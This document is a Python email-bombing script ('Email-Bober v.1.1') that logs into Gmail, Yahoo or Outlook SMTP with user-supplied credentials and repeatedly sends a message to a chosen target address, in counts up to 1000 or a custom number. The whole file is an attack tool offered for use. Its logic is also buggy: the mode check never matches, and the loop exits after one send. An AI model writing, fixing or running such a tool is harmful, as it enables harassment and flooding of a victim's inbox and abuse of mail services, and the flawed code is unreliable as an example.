import smtplib
import sys
import importlib
import time

def check_packages(packages):
    for package in packages:
        try:
            importlib.import_module(package)
            print(f"Found '{package}' :D")
        except ImportError:
            print(f"Package '{package}' is NOT installed :c")

packages_to_check = ["colorama", "time", "os"]

check_packages(packages_to_check)


class bcolors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    RESET = '\033[0m'

def banner():
    print('+[+[+[ Email-Bober v.1.1')
    print('+[+[+[ made with codes ]+]+]+')
    print('+[+[+[ made from Kittyy ]+]+]+')
    print('')
    print(bcolors.RED + '▓█████  ███▄ ▄███▓ ▄▄▄       ██▓ ██▓     ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  ')
    time.sleep(0.1)
    print(bcolors.RED + '▓█   ▀ ▓██▒▀█▀ ██▒▒████▄    ▓██▒▓██▒    ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒▒ ██')
    time.sleep(0.1)
    print(bcolors.RED + '▒███   ▓██    ▓██░▒██  ▀█▄  ▒██▒▒██░    ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒')
    time.sleep(0.1)
    print(bcolors.RED + '▒▓█  ▄ ▒██    ▒██ ░██▄▄▄▄██ ░██░▒██░    ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  ')
    time.sleep(0.1)
    print(bcolors.RED + '░▒████▒▒██▒   ░██▒ ▓█   ▓██▒░██░░██████▒░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒')
    time.sleep(0.1)
    print(bcolors.RED + '░░ ▒░ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░▓  ░ ▒░▓  ░░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░')
    time.sleep(0.1)
    print(bcolors.RED + ' ░ ░  ░░  ░      ░  ▒   ▒▒ ░ ▒ ░░ ░ ▒  ░▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░')
    time.sleep(0.1)
    print(bcolors.RED + '   ░   ░      ░     ░   ▒    ▒ ░  ░ ░    ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ ')
    time.sleep(0.1)
    print(bcolors.RED + '   ░  ░       ░         ░  ░ ░      ░  ░ ░          ░ ░         ░    ░         ░  ░   ░     ')
    time.sleep(0.1)
    print(bcolors.RED + '                                              ░                           ░                 ')


#https://patorjk.com/software/taag/#p=display&f=Bloody&t=EmailBomber
class Email_Bomber:
    count = 0
    
    def __init__(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Inititializing program ]+]+]+')
            self.target = str(input(bcolors.RED + 'Enter target email <: '))
            self.mode = str(input(bcolors.RED + 'Enter BOMB mode (1,2,3,4) // 1:(1000) 2:(500) 3:(250) 4:(custom) <: '))
            if int(self.mode) > int(4) or int(self.mode) < int(1):
                print('ERROR: Invalid Option. Goodbye')
                sys.exit(1)
        except Exception as e:
            print(f'ERROR: {e}')
    def bomb(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up bomb ]+]+]+')
            self.amount = None
            if self.mode == int(1):
                self.amount = int(1000)
            elif self.mode == int(2):
                self.amount = int(500)
            elif self.mode == int(3):
                self.amount = int(250)
            else:
                self.amount = int(input(bcolors.RED + 'Choose a CUSTOM amount <: '))
            print(bcolors.RED + f'\n+[+[+[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]+]+]+')
        except Exception as e:
            print(f'ERROR {e}')

    def email(self):
        try:
            print(bcolors.RED + '\n+[+[+[ Setting up email ]+]+]+')
            self.server = str(input(bcolors.RED + 'Enter email server / or select premade options - 1:Gmail 2:Yahoo 3:Outlook <: '))
            premade = ['1', '2', '3']
            default_port = True
            if self.server not in premade:
                default_port = False
                self.port = int(input(bcolors.RED + 'Enter port number <: '))
            
            if default_port == True:
                self.port = int(587)

            if self.server == '1':
                self.server = 'smtp.gmail.com'
            
            elif self.server == '2':
                self.server = 'smtp.mail.yahoo.com'
            
            elif self.server == '3':
                self.server = 'smtp-mail.Outlook.com'
            
            self.fromAddr = str(input(bcolors.RED + 'Enter from address <: '))
            self.fromPwd = str(input(bcolors.RED + 'Enter from password <: '))
            self.subject = str(input(bcolors.RED + 'Enter subject <: '))
            self.message = str(input(bcolors.RED + 'Enter message <: '))

            self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
            ''' % (self.fromAddr, self.target, self.subject, self.message)

            self.s = smtplib.SMTP(self.server, self.port)
            self.s.ehlo()
            self.s.starttls()
            self.s.ehlo()
            self.s.login(self.fromAddr, self.fromPwd)
        except Exception as e:
            print(f'ERROR: {e}')

    def send(self):
        try:
            self.s.sendmail(self.fromAddr, self.target, self.msg)
            self.count +=1
            print(bcolors.GREEN + f'BOMB: {self.count}')
        except Exception as e:
            print('ERROR: {e}')

    def attack(self):
        print(bcolors.GREEN + '\n+[+[+[ Attacking... ]+]+]+')
        for email in range(self.amount+1):
            self.send()
            self.s.close()
            print(bcolors.GREEN + '\n+[+[+[ Attack finished ]+]+]+')
            sys.exit(0)

if __name__=='__main__':
    banner()
    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()